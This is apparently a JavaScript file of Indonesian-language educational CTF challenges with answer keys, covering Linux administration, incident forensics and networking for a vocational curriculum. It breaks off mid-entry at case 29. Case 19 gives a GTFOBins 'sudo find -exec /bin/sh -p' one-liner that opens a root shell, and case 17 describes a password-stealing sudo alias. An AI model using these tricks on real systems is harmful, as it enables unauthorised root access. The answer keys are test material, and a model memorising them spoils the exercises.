/**
 * 60 KASUS CTF EDUKATIF BERJENJANG (LOW -> MEDIUM -> HIGH)
 * KURIKULUM MERDEKA SMK TJKT (TEKNIK JARINGAN KOMPUTER & TELEKOMUNIKASI)
 * 
 * 4 PILAR KOMPETENSI:
 * 1. Linux Dasar & Administrasi Server (Kasus 1 - 20)
 * 2. Jaringan Komputer, Protokol & Firewall (Kasus 21 - 40)
 * 3. Keamanan Siber, Web & Kriptografi Forensik (Kasus 41 - 55)
 * 4. Keamanan Perangkat Keras, IoT & Embedded Network (Kasus 56 - 60)
 */

const baseChallenges = [
  // ==================== PILAR 1: LINUX DASAR & ADMINISTRASI SERVER (1 - 20) ====================
  {
    id: 1,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Orientasi Direktori Aktif (pwd)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Mengetahui posisi direktori kerja saat ini dalam struktur hirarki sistem berkas Linux.',
    lesson: 'Dalam sistem operasi Linux, seluruh berkas dan folder berakar pada direktori root (/). Perintah pwd (print working directory) mencetak path absolut tempat pengguna sedang berada agar tidak salah menimpa berkas.',
    details: [
      { title: 'Hirarki Tunggal Linux', content: 'Linux tidak menggunakan drive C: atau D:. Seluruh partisi dimount ke dalam satu pohon direktori di bawah root (/).' },
      { title: 'Perintah Orientasi', content: '<code>pwd</code> menampilkan path direktori aktif saat ini.' }
    ],
    audioText: 'Kasus satu: Orientasi Direktori Aktif. Jalankan perintah p w d di terminal simulasi untuk mengetahui lokasi kerja Anda.',
    task: 'Jalankan perintah pwd pada terminal simulasi. Apakah path direktori kerja tempat Anda berada saat ini?',
    answers: ['/home/student', '/home/student/'],
    hint: 'Ketik pwd pada terminal simulasi.',
    explain: 'pwd menampilkan path direktori absolut pengguna aktif saat ini (/home/student).'
  },
  {
    id: 2,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Deteksi Berkas Tersembunyi (ls -la)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Mendeteksi berkas tersembunyi (dotfiles) yang diawali karakter titik.',
    lesson: 'Berkas yang diawali tanda titik disembunyikan oleh sistem dari perintah ls standar. Untuk melihatnya beserta atribut perizinan, gunakan opsi ls -la.',
    details: [
      { title: 'Opsi -a (all)', content: 'Menampilkan seluruh berkas termasuk yang diawali tanda titik (.) seperti .bashrc dan .secret.' },
      { title: 'Opsi -l (long listing)', content: 'Menampilkan izin rwx, pemilik, ukuran, dan tanggal modifikasi.' }
    ],
    audioText: 'Kasus dua: Berkas Tersembunyi. Gunakan perintah l s spasi minus l a untuk menampilkan seluruh berkas tersembunyi.',
    task: 'Jalankan ls -la di terminal simulasi. Apa nama berkas rahasia tersembunyi (dotfile) yang ditemukan di folder aktif?',
    answers: ['.secret', '.secret_flag.txt', '.secret.txt'],
    hint: 'Cari berkas yang namanya diawali karakter titik pada keluaran ls -la.',
    explain: 'Karakter titik (.) di awal nama berkas menjadikannya tersembunyi dari tampilan ls standar.'
  },
  {
    id: 3,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Pembacaan Konfigurasi Sensitif (cat)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Membaca isi berkas teks konfigurasi langsung dari terminal shell.',
    lesson: 'Perintah cat (concatenate) digunakan untuk membaca dan menampilkan isi berkas teks ke layar standar keluaran (stdout).',
    details: [
      { title: 'Penggunaan cat', content: 'Sintaks: <code>cat nama_berkas</code> mencetak seluruh isi teks tanpa membuka text editor.' }
    ],
    audioText: 'Kasus tiga: Pembacaan Berkas Teks. Gunakan perintah cat spasi nama berkas untuk membaca isi teks konfigurasi.',
    task: 'Baca isi berkas .secret menggunakan perintah cat .secret. Berapakah nilai flag rahasia yang tercantum di dalamnya?',
    answers: ['CTF{linux_cat_basic_found}', 'linux_cat_basic_found'],
    hint: 'Ketik cat .secret pada terminal.',
    explain: 'cat membaca stream data berkas dan mencetaknya langsung ke layar terminal.'
  },
  {
    id: 4,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Pencarian Kata Kunci Log (grep)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Menyaring baris teks yang mengandung pola kata kunci tertentu dalam berkas log.',
    lesson: 'Utilitas grep (global regular expression print) memungkinkan teknisi menyaring ribuan baris log server untuk menemukan kegagalan atau anomali spesifik.',
    details: [
      { title: 'Sintaks grep', content: '<code>grep "pola" nama_berkas</code> hanya menampilkan baris yang mengandung teks yang dicari.' }
    ],
    audioText: 'Kasus empat: Penyaringan Log dengan grep. Gunakan grep untuk menemukan alamat IP penyerang di log autentikasi.',
    task: 'Jalankan perintah grep "Failed password" auth.log. Dari alamat IP manakah percobaan brute-force login berasal?',
    answers: ['192.168.1.150', '192.168.1.150:22'],
    hint: 'Gunakan grep "Failed password" auth.log.',
    explain: 'grep memfilter keluaran teks sehingga teknisi cepat mengidentifikasi IP penyerang.'
  },
  {
    id: 5,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Penelusuran Lokasi Berkas (find)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Mencari berkas spesifik di seluruh pohon direktori berdasarkan kriteria nama.',
    lesson: 'Perintah find menelusuri pohon direktori secara rekursif. Opsi -name digunakan untuk mencocokkan nama berkas target.',
    details: [
      { title: 'Perintah find', content: '<code>find /path -name "nama_berkas"</code> mencari berkas secara rekursif.' }
    ],
    audioText: 'Kasus lima: Penelusuran Berkas dengan find. Temukan lokasi berkas kunci backup sistem.',
    task: 'Jalankan find /var -name "backup.key". Di direktori manakah berkas backup.key tersimpan?',
    answers: ['/var/backups', '/var/backups/backup.key'],
    hint: 'Gunakan perintah find /var -name "backup.key".',
    explain: 'find menelusuri seluruh subdirektori di bawah /var hingga menemukan berkas yang diminta.'
  },
  {
    id: 6,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Manajemen Hak Akses Berkas (chmod)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Memahami representasi hak akses berkas dalam notasi oktal (rwx).',
    lesson: 'Hak akses Linux dibagi menjadi Pemilik (User), Kelompok (Group), dan Lainnya (Others). Notasi r=4, w=2, x=1. Notasi 755 berarti rwxr-xr-x.',
    details: [
      { title: 'Nilai Notasi Oktal', content: 'Read=4, Write=2, Execute=1. Total maksimal 7 (rwx).' }
    ],
    audioText: 'Kasus enam: Hak Akses Berkas. Berapakah nilai numerik oktal untuk hak akses penuh pemilik, serta hanya baca dan eksekusi untuk grup?',
    task: 'Sebuah skrip deployment membutuhkan izin: Pemilik (rwx), Grup (r-x), Others (r-x). Berapakah nilai 3 digit oktal yang harus dimasukkan pada chmod?',
    answers: ['755', 'chmod 755'],
    hint: 'Hitung: (4+2+1) untuk User, (4+0+1) untuk Group, dan (4+0+1) untuk Others.',
    explain: 'Nilai 755 memberikan hak penuh (7) kepada pemilik dan hak baca/eksekusi (5) bagi grup dan lainnya.'
  },
  {
    id: 7,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Kepemilikan Berkas & Grup (chown)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Mengubah pemilik dan grup suatu berkas atau direktori.',
    lesson: 'Perintah chown (change owner) menetapkan kepemilikan user dan grup pada berkas. Contoh format: chown user:grup berkas.',
    details: [
      { title: 'Format chown', content: '<code>chown www-data:www-data /var/www/html</code> mengatur kepemilikan web server.' }
    ],
    audioText: 'Kasus tujuh: Kepemilikan Berkas. Perintah apakah yang digunakan untuk mengganti kepemilikan user dan grup pada sistem Linux?',
    task: 'Perintah apakah yang digunakan administrator Linux untuk mengubah kepemilikan user dan grup berkas?',
    answers: ['chown', 'chown command'],
    hint: 'Singkatan dari change owner.',
    explain: 'chown mengubah user pemilik dan grup yang berhak mengelola berkas.'
  },
  {
    id: 8,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Inspeksi Daftar Proses Sistem (ps aux)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Mendeteksi seluruh proses aktif yang sedang dieksekusi di background sistem.',
    lesson: 'Perintah ps aux menampilkan seluruh proses dari semua user di sistem. Opsi a=semua user, u=format user rinci, x=termasuk proses tanpa terminal kontrol.',
    details: [
      { title: 'Kolom Kunci ps aux', content: 'PID (Process ID), %CPU, %MEM, COMMAND (perintah yang dijalankan).' }
    ],
    audioText: 'Kasus delapan: Inspeksi Proses. Jalankan perintah p s spasi a u x di terminal untuk menemukan program miner yang memakan CPU.',
    task: 'Jalankan ps aux di terminal simulasi. Apa nama proses biner mencurigakan yang mengonsumsi CPU tinggi?',
    answers: ['xmrig', './xmrig', 'cryptominer'],
    hint: 'Perhatikan kolom COMMAND pada baris dengan %CPU paling tinggi.',
    explain: 'xmrig adalah program crypto-miner yang sering diselundupkan penyerang untuk menyedot sumber daya server.'
  },
  {
    id: 9,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Terminasi Paksa Proses Malware (kill -9)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Mengirimkan sinyal SIGKILL untuk menghentikan proses jahat seketika.',
    lesson: 'Perintah kill mengirim sinyal ke nomor PID proses. Sinyal -9 (SIGKILL) memaksa kernel menghentikan proses tanpa menunggu penanganan internal.',
    details: [
      { title: 'Sinyal SIGKILL', content: '<code>kill -9 &lt;PID&gt;</code> menghentikan proses yang hang atau malware membandel.' }
    ],
    audioText: 'Kasus sembilan: Terminasi Proses. Sinyal nomor berapakah pada perintah kill yang merepresentasikan SIGKILL?',
    task: 'Berapakah nomor sinyal kill (SIGKILL) yang digunakan untuk memaksa proses berhenti seketika?',
    answers: ['-9', '9', 'SIGKILL'],
    hint: 'Sinyal pemaksaan darurat bernomor 9.',
    explain: 'Sinyal 9 langsung diintervensi oleh kernel Linux tanpa bisa diabaikan oleh proses.'
  },
  {
    id: 10,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Analisis Kapasitas Storage Disk (df -h)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Memeriksa sisa ruang partisi hard disk dalam format yang mudah dibaca manusia.',
    lesson: 'Perintah df (disk free) dengan opsi -h (human-readable) menampilkan sisa kapasitas partisi dalam satuan Megabyte atau Gigabyte.',
    details: [
      { title: 'Opsi -h', content: 'Menampilkan ukuran dalam KB, MB, GB daripada jumlah blok byte mentah.' }
    ],
    audioText: 'Kasus sepuluh: Kapasitas Hard Disk. Gunakan perintah d f spasi minus h untuk menganalisis partisi sistem.',
    task: 'Jalankan df -h pada terminal. Partisi manakah yang terisi penuh mencapai 100% kapasitas?',
    answers: ['/var/log', '/var'],
    hint: 'Cari baris yang nilai kolom Use% mencapai 100%.',
    explain: 'Partisi /var/log sering kali penuh karena serangan logging flood atau log server yang tidak dirotasi.'
  },
  {
    id: 11,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Manajemen Arsip Berkas (tar)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Mengekstrak dan membedah arsip berkas terkompresi .tar.gz.',
    lesson: 'Perintah tar -xzvf digunakan untuk: x=extract, z=gzip, v=verbose, f=file. Ini adalah format standar arsip cadangan di server Linux.',
    details: [
      { title: 'Kombinasi Opsi', content: '<code>-xzvf</code> mengekstrak arsip terkompresi GZIP.' }
    ],
    audioText: 'Kasus sebelas: Ekstraksi Arsip. Opsi huruf apakah pada perintah tar yang berfungsi untuk mengekstrak isi arsip?',
    task: 'Opsi parameter huruf tunggal apakah pada utilitas tar yang berfungsi untuk melakukan ekstraksi (extract)?',
    answers: ['-x', 'x'],
    hint: 'Huruf pertama dari kata extract.',
    explain: 'Opsi x menginstruksikan tar untuk mengekstrak isi arsip ke direktori aktif.'
  },
  {
    id: 12,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Audit Skrip Otomasi Terjadwal (crontab)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Mendeteksi tugas terjadwal berbahaya yang disematkan penyerang untuk persistensi.',
    lesson: 'Cron daemon menjalankan perintah otomatis pada interval waktu tertentu. Penyerang sering menyisipkan baris crontab agar backdoor tetap aktif berkala.',
    details: [
      { title: 'Pemeriksaan Crontab', content: '<code>crontab -l</code> menampilkan daftar jadwal aktif pengguna.' }
    ],
    audioText: 'Kasus dua belas: Audit Crontab. Jalankan perintah crontab minus l di terminal simulasi untuk mendeteksi skrip backdoor.',
    task: 'Jalankan crontab -l di terminal simulasi. Apa nama skrip backdoor yang dijadwalkan berjalan otomatis setiap jam?',
    answers: ['/tmp/.beacon.sh', '.beacon.sh', 'beacon.sh'],
    hint: 'Periksa baris di bawah crontab -l yang memuat perintah eksekusi skrip.',
    explain: 'Skrip .beacon.sh dieksekusi setiap jam untuk menghubungi server penyerang secara otomatis.'
  },
  {
    id: 13,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Audit Layanan Servis Systemd (systemctl)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Memeriksa status aktif dan daemon layanan server jaringan pada init systemd.',
    lesson: 'systemctl adalah utilitas pengendali sistem init systemd. Perintah systemctl status nama_layanan menampilkan kondisi aktif, port, dan log error.',
    details: [
      { title: 'Status Layanan', content: '<code>systemctl status ssh</code> menampilkan status daemon secure shell.' }
    ],
    audioText: 'Kasus tiga belas: Status Servis Systemd. Periksa status layanan web server nginx di terminal.',
    task: 'Jalankan systemctl status nginx di terminal simulasi. Berapakah nomor port listening tempat web server nginx melayani koneksi?',
    answers: ['80', 'port 80'],
    hint: 'Lihat informasi binding port pada deskripsi status nginx.',
    explain: 'Nginx secara standar melayani protokol HTTP tidak terenkripsi pada port 80.'
  },
  {
    id: 14,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Analisis Struktur Akun Sistem (/etc/passwd)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Memeriksa daftar akun pengguna, User ID (UID), dan default shell interaktif.',
    lesson: 'Berkas /etc/passwd berisi informasi seluruh akun di sistem. Kolom ketiga adalah UID (User ID). UID 0 adalah hak akses root absolut.',
    details: [
      { title: 'Struktur /etc/passwd', content: 'Format: <code>username:x:UID:GID:info:home:shell</code>. Akun biasa memiliki UID >= 1000.' }
    ],
    audioText: 'Kasus empat belas: Berkas passwd. Buka /etc/passwd dan cari akun mencurigakan yang memiliki UID nol selain root.',
    task: 'Jalankan cat /etc/passwd di terminal. Akun backdoor apakah yang memiliki UID 0 selain akun root?',
    answers: ['toor', 'admin2'],
    hint: 'Cari baris yang memiliki angka :0:0: pada kolom UID dan GID.',
    explain: 'Akun dengan UID 0 memiliki hak kekuasaan root penuh pada kernel Linux.'
  },
  {
    id: 15,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Format Hash Kata Sandi Linux (/etc/shadow)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Mengidentifikasi algoritma hashing kata sandi yang tersimpan pada berkas terproteksi /etc/shadow.',
    lesson: 'Berkas /etc/shadow menyimpan hash kata sandi terenkripsi. Kode awalan $6$ menandakan penggunaan algoritma modern SHA-512 dengan salting kriptografis.',
    details: [
      { title: 'Prefix Hash Linux', content: '$1$=MD5, $5$=SHA-256, $6$=SHA-512. Semakin panjang dan kompleks, semakin tahan terhadap brute-force.' }
    ],
    audioText: 'Kasus lima belas: Berkas Shadow. Prefix $6$ pada hash kata sandi Linux merepresentasikan algoritma apa?',
    task: 'Prefix string $6$ pada baris hash kata sandi berkas /etc/shadow menandakan penggunaan algoritma hashing apa?',
    answers: ['SHA-512', 'SHA512', 'sha-512'],
    hint: 'Keluarga SHA dengan panjang output 512 bit.',
    explain: '$6$ adalah penanda algoritma SHA-512 di sistem operasi berbasis Linux modern.'
  },
  {
    id: 16,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Investigasi Log Sistem (journalctl)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Menganalisis log biner sistem operasi systemd untuk investigasi insiden.',
    lesson: 'journalctl mengumpulkan log biner dari kernel, daemon, dan modul systemd. Opsi -u memfilter log untuk layanan spesifik.',
    details: [
      { title: 'Kueri journalctl', content: '<code>journalctl -u ssh -n 20</code> menampilkan 20 baris log terakhir layanan SSH.' }
    ],
    audioText: 'Kasus enam belas: Investigasi Log journalctl. Cari informasi crash daemon pada log sistem.',
    task: 'Jalankan journalctl -u apache2 di terminal simulasi. Error code apakah yang menyebabkan web server gagal booting?',
    answers: ['AH00072', 'Address already in use', '98'],
    hint: 'Periksa baris error binding port pada keluaran journalctl.',
    explain: 'AH00072 (Address already in use) terjadi ketika port yang diminta telah dipakai oleh aplikasi lain.'
  },
  {
    id: 17,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Deteksi Manipulasi Alias Shell (alias)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Mendeteksi pembajakan perintah bawaan sistem melalui berkas .bashrc.',
    lesson: 'Penyerang dapat menyematkan perintah alias berbahaya (misal alias sudo="log_password; sudo") untuk mencuri kredensial teknisi saat mengetik perintah biasa.',
    details: [
      { title: 'Perintah alias', content: 'Ketik <code>alias</code> tanpa argumen untuk menampilkan semua pemetaan alias di sesi aktif.' }
    ],
    audioText: 'Kasus tujuh belas: Pembajakan Alias. Periksa daftar alias di terminal untuk menemukan perintah yang dimodifikasi.',
    task: 'Jalankan perintah alias di terminal simulasi. Perintah standar apakah yang telah dimanipulasi dengan skrip logger penyerang?',
    answers: ['sudo', 'alias sudo'],
    hint: 'Cari perintah penting yang di-redirect ke skrip lain.',
    explain: 'Pembajakan alias sudo memungkinkan penyerang mencegat kata sandi admin saat dimasukkan.'
  },
  {
    id: 18,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Eskalasi Hak Akses SUID Bit (chmod u+s)',
    difficulty: 'Sulit (High)',
    points: 200,
    summary: 'Mendeteksi berkas biner berekstensi SUID yang dieksekusi dengan hak akses pemilik root.',
    lesson: 'SUID (Set Owner User ID) memungkinkan pengguna biasa menjalankan biner dengan hak pemilik biner tersebut. Jika pemiliknya root, celah pada biner dapat memberikan shell root.',
    details: [
      { title: 'Pencarian Biner SUID', content: '<code>find / -perm -4000 -type f 2>/dev/null</code> mencari seluruh biner ber-SUID.' }
    ],
    audioText: 'Kasus delapan belas: Biner SUID. Temukan biner kustom tidak standar yang memiliki SUID bit root.',
    task: 'Jalankan find / -perm -4000 -type f 2>/dev/null di terminal simulasi. Apa biner kustom mencurigakan di folder /usr/local/bin?',
    answers: ['vuln_backup', '/usr/local/bin/vuln_backup'],
    hint: 'Cari biner yang berada di path /usr/local/bin.',
    explain: 'Biner SUID vuln_backup dapat dieksploitasi untuk melompat ke hak akses root.'
  },
  {
    id: 19,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Eksploitasi Sudoers NOPASSWD (GTFOBins)',
    difficulty: 'Sulit (High)',
    points: 200,
    summary: 'Menganalisis kesalahan konfigurasi sudoers yang memungkinkan eskalasi hak root tanpa kata sandi.',
    lesson: 'Jika file /etc/sudoers mengizinkan pengguna menjalankan utilitas tertentu dengan NOPASSWD, penyerang dapat memanfaatkan teknik GTFOBins untuk mendapatkan shell root.',
    details: [
      { title: 'Teknik find -exec', content: '<code>sudo find . -exec /bin/sh -p \\;</code> membuka shell root interaktif.' }
    ],
    audioText: 'Kasus sembilan belas: GTFOBins sudoers. Parameter apakah pada utilitas find yang mampu mengeksekusi shell root?',
    task: 'Jalankan sudo -l di terminal. Biner /usr/bin/find diizinkan NOPASSWD. Opsi argumen find apakah yang dapat mengeksekusi shell eksternal?',
    answers: ['-exec', 'exec'],
    hint: 'Opsi untuk mengeksekusi perintah pada setiap berkas yang ditemukan.',
    explain: 'Opsi -exec pada perintah find mengeksekusi shell langsung dengan privilese root.'
  },
  {
    id: 20,
    topic: 'Linux Dasar',
    category: 'Linux',
    title: 'Rekonstruksi Insiden Log Keamanan (/var/log/auth.log)',
    difficulty: 'Sulit (High)',
    points: 200,
    summary: 'Mendeteksi titik keberhasilan login penyerang setelah puluhan percobaan brute-force.',
    lesson: 'Setelah ratusan baris "Failed password", baris "Accepted password" menandakan bahwa penyerang telah berhasil menebak kata sandi dan membobol server.',
    details: [
      { title: 'Pola Kunci Sukses Login', content: '<code>grep "Accepted password" /var/log/auth.log</code> menampilkan login yang berhasil.' }
    ],
    audioText: 'Kasus dua puluh: Rekonstruksi Brute-Force. Cari tahu akun pengguna manakah yang berhasil dibobol oleh penyerang.',
    task: 'Jalankan grep "Accepted password" auth.log di terminal. Akun pengguna manakah yang berhasil dibobol oleh penyerang?',
    answers: ['deployer', 'user deployer'],
    hint: 'Periksa nama akun di sebelah tulisan for ... port.',
    explain: 'Akun deployer menggunakan kata sandi lemah sehingga berhasil dibobol via serangan brute-force.'
  },

  // ==================== PILAR 2: JARINGAN KOMPUTER, PROTOKOL & FIREWALL (21 - 40) ====================
  {
    id: 21,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Identifikasi Antarmuka Jaringan (ip addr)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Melihat konfigurasi antarmuka jaringan, status tautan fisik, dan alamat IP.',
    lesson: 'Perintah ip addr (atau ifconfig) menampilkan seluruh antarmuka jaringan fisik dan virtual (seperti eth0, wlan0, lo).',
    details: [
      { title: 'Antarmuka Loopback', content: 'Antarmuka lo dengan IP 127.0.0.1 digunakan untuk komunikasi internal perangkat sendiri.' }
    ],
    audioText: 'Kasus dua puluh satu: Antarmuka Jaringan. Jalankan i p spasi a d d r di terminal untuk melihat IP loopback.',
    task: 'Berapakah alamat IP standar yang dialokasikan untuk antarmuka loopback (lo)?',
    answers: ['127.0.0.1', '127.0.0.1/8', 'localhost'],
    hint: 'Alamat IP lokal standar localhost.',
    explain: '127.0.0.1 adalah alamat IPv4 loopback standar IANA untuk komunikasi lokal.'
  },
  {
    id: 22,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Uji Konektivitas Protokol ICMP (ping)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Menguji keterjangkauan host target dan mengukur waktu latensi bolak-balik (RTT).',
    lesson: 'Utilitas ping mengirimkan paket ICMP Echo Request (Type 8) dan menunggu balasan ICMP Echo Reply (Type 0) dari host tujuan.',
    details: [
      { title: 'Protokol ICMP', content: 'Berjalan di atas layer Internet (Network Layer IP) tanpa nomor port transport.' }
    ],
    audioText: 'Kasus dua puluh dua: Uji Konektivitas ping. Protokol apakah di Layer Network yang digunakan oleh utilitas ping?',
    task: 'Protokol apakah yang menjadi fondasi kerja utilitas pengujian konektivitas ping?',
    answers: ['ICMP', 'Internet Control Message Protocol', 'icmp'],
    hint: 'Singkatan dari Internet Control Message Protocol.',
    explain: 'Ping memanfaatkan protokol ICMP untuk mengirimkan paket Echo Request dan menerima Echo Reply.'
  },
  {
    id: 23,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Pelacakan Rute Hop Jaringan (traceroute)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Melacak jalur lompatan (hop) router yang dilewati paket menuju tujuan.',
    lesson: 'traceroute memanfaatkan nilai TTL (Time To Live) pada header IP yang dinaikkan bertahap (1, 2, 3...) untuk memaksa router membalas ICMP Time Exceeded.',
    details: [
      { title: 'Fungsi TTL', content: 'Mencegah paket berputar selamanya di jaringan (routing loop).' }
    ],
    audioText: 'Kasus dua puluh tiga: Pelacakan Rute. Field header IP apakah yang dimanipulasi oleh utilitas traceroute?',
    task: 'Field header paket IP apakah yang dinaikkan nilainya secara bertahap oleh utilitas traceroute untuk memetakan router per hop?',
    answers: ['TTL', 'Time to Live', 'Time To Live', 'ttl'],
    hint: 'Singkatan dari Time To Live.',
    explain: 'Traceroute mengirim paket dengan TTL=1, lalu TTL=2, hingga mencapai tujuan akhir.'
  },
  {
    id: 24,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Pemetaan Port Layanan Listening (ss -tuln)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Melihat soket port TCP dan UDP yang sedang membuka koneksi di komputer server.',
    lesson: 'Perintah ss (socket statistics) opsi -tuln: t=TCP, u=UDP, l=Listening, n=Numeric port. Opsi ini menggantikan netstat pada distro Linux modern.',
    details: [
      { title: 'Port Well-Known', content: 'Port 0–1023 adalah port standar (contoh: 22=SSH, 53=DNS, 80=HTTP, 443=HTTPS).' }
    ],
    audioText: 'Kasus dua puluh empat: Soket Port Jaringan. Berapakah nomor port standar untuk layanan aman Secure Shell SSH?',
    task: 'Berapakah nomor port TCP standar yang digunakan oleh layanan Secure Shell (SSH)?',
    answers: ['22', 'port 22'],
    hint: 'Nomor port standar SSH terdaftar di IANA.',
    explain: 'Port 22 adalah port standar IANA untuk koneksi remote SSH terenkripsi.'
  },
  {
    id: 25,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Kueri Resolusi Nama Domain (nslookup & dig)',
    difficulty: 'Dasar (Low)',
    points: 100,
    summary: 'Melakukan kueri DNS untuk menerjemahkan nama domain menjadi alamat IP.',
    lesson: 'DNS (Domain Name System) bekerja pada port 53 (UDP untuk kueri normal, TCP untuk zone transfer). dig dan nslookup adalah alat kueri DNS utama.',
    details: [
      { title: 'Port DNS', content: 'Layanan Domain Name System beroperasi secara standar pada port 53.' }
    ],
    audioText: 'Kasus dua puluh lima: Resolusi DNS. Berapakah nomor port standar yang digunakan oleh protokol DNS?',
    task: 'Berapakah nomor port transport (UDP/TCP) standar yang digunakan oleh protokol Domain Name System (DNS)?',
    answers: ['53', 'port 53'],
    hint: 'Port standar DNS server.',
    explain: 'DNS beroperasi pada port 53 untuk merespons kueri resolusi domain ke IP.'
  },
  {
    id: 26,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Resolusi MAC Address & ARP Poisoning (arp -a)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Mendeteksi tabel ARP cache dan indikasi serangan pemalsuan MAC Address (Man-in-the-Middle).',
    lesson: 'ARP (Address Resolution Protocol) memetakan IP ke MAC address pada jaringan lokal. Jika dua IP berbeda memiliki MAC address yang sama, dicurigai terjadi serangan ARP Spoofing.',
    details: [
      { title: 'Tanda ARP Spoofing', content: 'Dua entri IP berbeda (misal Gateway dan Penyerang) mengarah ke MAC Address identik.' }
    ],
    audioText: 'Kasus dua puluh enam: Tabel ARP. Jalankan perintah a r p spasi minus a di terminal untuk mendeteksi anomali MAC Address.',
    task: 'Jalankan arp -a di terminal simulasi. MAC Address apakah yang terduplikasi pada IP Gateway dan IP penyerang?',
    answers: ['aa:bb:cc:dd:ee:ff', 'AA:BB:CC:DD:EE:FF'],
    hint: 'Perhatikan MAC address yang muncul dua kali pada keluaran arp -a.',
    explain: 'Duplikasi MAC address pada tabel ARP menandakan penyerang melakukan peracunan ARP cache (ARP Poisoning).'
  },
  {
    id: 27,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Perhitungan Subnetting IPv4 & CIDR',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Menghitung jumlah host yang dapat dialokasikan pada notasi CIDR /24 dan /26.',
    lesson: 'Notasi CIDR /26 memiliki netmask 255.255.255.192. Total alamat IP = 2^(32-26) = 64 alamat. Dikurangi 2 (Network ID dan Broadcast), sisa host valid = 62.',
    details: [
      { title: 'Rumus Host Valid', content: 'Host usable = 2^(32 - prefix) - 2.' }
    ],
    audioText: 'Kasus dua puluh tujuh: Subnetting IPv4. Berapakah jumlah alamat IP host valid yang dapat digunakan pada subnet dengan prefix slash dua puluh enam?',
    task: 'Pada subnet IPv4 dengan notasi CIDR /26, berapakah jumlah alamat IP host yang valid dan dapat dialokasikan ke perangkat klien?',
    answers: ['62', '62 host', '62 ip'],
    hint: 'Total 64 dikurangi 1 untuk Network ID dan 1 untuk Broadcast Address.',
    explain: 'Pada /26: 2^6 = 64 alamat total. 64 - 2 = 62 alamat host valid.'
  },
  {
    id: 28,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Analisis Tabel Routing & Default Gateway (ip route)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Menentukan rute default gateway yang menjadi pintu gerbang keluar paket menuju internet.',
    lesson: 'Perintah ip route show menampilkan tabel routing kernel. Baris yang diawali "default via IP" menentukan gateway keluar untuk paket di luar jaringan lokal.',
    details: [
      { title: 'Default Gateway', content: 'Menjadi tujuan forwarding router ketika alamat IP tujuan tidak ada di subnet lokal.' }
    ],
    audioText: 'Kasus dua puluh delapan: Tabel Routing. Jalankan i p spasi r o u t e di terminal untuk mencari IP default gateway.',
    task: 'Jalankan ip route di terminal simulasi. Berapakah alamat IP default gateway yang tercantum pada tabel routing?',
    answers: ['192.168.1.1', '192.168.1.1 dev eth0'],
    hint: 'Cari baris yang diawali kata default via ...',
    explain: '192.168.1.1 adalah router gateway lokal penghubung ke jaringan internet.'
  },
  {
    id: 29,
    topic: 'Jaringan & Protokol',
    category: 'Jaringan',
    title: 'Analisis Handshake DHCP (DORA)',
    difficulty: 'Sedang (Medium)',
    points: 150,
    summary: 'Memahami 4 tahapan alokasi otomatis alamat IP oleh server DHCP kepada klien.',
    lesson: 'Proses alokasi DHCP mengikuti akronim DORA: Discover (klien broadcast cari server), Offer (server tawarkan IP), Request (klien ajukan permohonan), Acknowledge (server konfirmasi final).',
    details: [
      { title: 'Urutan DORA', content: 'Discover -> Offer -> Request -> Acknowledge.' }
    ],
    audioText: 'Kasus dua puluh sembilan: DHCP DORA. Tahapan apakah huruf O dalam akronim DORA?',
    task: 'Pada siklus alokasi alamat IP protokol DHCP (DORA), istilah apakah yang diwakili oleh huruf "O"?',
    answers: ['Offer', 'DHCP Offer', 'offer'],
    hint: 'Server "menawarkan" konfigurasi IP ke klien.',
